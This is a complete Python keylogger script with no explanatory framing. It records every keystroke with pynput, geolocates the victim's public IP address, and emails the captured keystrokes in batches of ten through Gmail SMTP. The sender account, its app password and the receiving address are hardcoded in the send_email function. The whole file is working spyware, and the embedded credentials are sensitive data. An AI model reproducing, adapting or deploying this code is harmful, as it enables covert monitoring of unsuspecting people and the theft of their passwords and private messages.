import pynput
from pynput.keyboard import Key, Listener
import smtplib
import ssl
import threading
import requests

def send_startup_email():
    global ipv4_address
    try:
        response = requests.get('https://httpbin.org/ip')
        ipv4_address = response.json().get('origin', None)
        location = "Unknown"
        if ipv4_address:
            try:
                ip_response = requests.get(f'http://ip-api.com/json/{ipv4_address}')
                ip_data = ip_response.json()
                if ip_data['status'] == 'success':
                    location = f"{ip_data['city']}, {ip_data['regionName']}, {ip_data['country']}"
            except Exception as e:
                print("Error retrieving location:", e)
        message = f"Connected from: {location}"
        send_email("Startup", message)
    except Exception as e:
        print(e)


def send_email(subject, message):
    smtp_server = "smtp.gmail.com"
    port = 587 
    sender_email = "ighelper123845@gmail.com"
    password = "hdrh zlqj ccdw zpxb"
    receiver_email = "ema.biasi2008@gmail.com"
    context = ssl.create_default_context()
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo() 
        server.starttls(context=context) 
        server.ehlo()
        server.login(sender_email, password)
        email_message = f"Subject: {subject} - {ipv4_address}\n\n{message}"
        server.sendmail(sender_email, receiver_email, email_message)
        server.quit()
    except Exception as e:
        print(e)

def format_message(keys):
    message = "".join(key.replace("'", "") if key != "Key.space" else " " for key in keys)
    return message

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count >= 10:
        count = 0
        message = format_message(keys)
        email_thread = threading.Thread(target=send_email, args=("Keylog", message))
        email_thread.start()

ipv4_address = None
keys = []
count = 0

send_startup_email()

with Listener(on_press=on_press) as listener:
    listener.join()
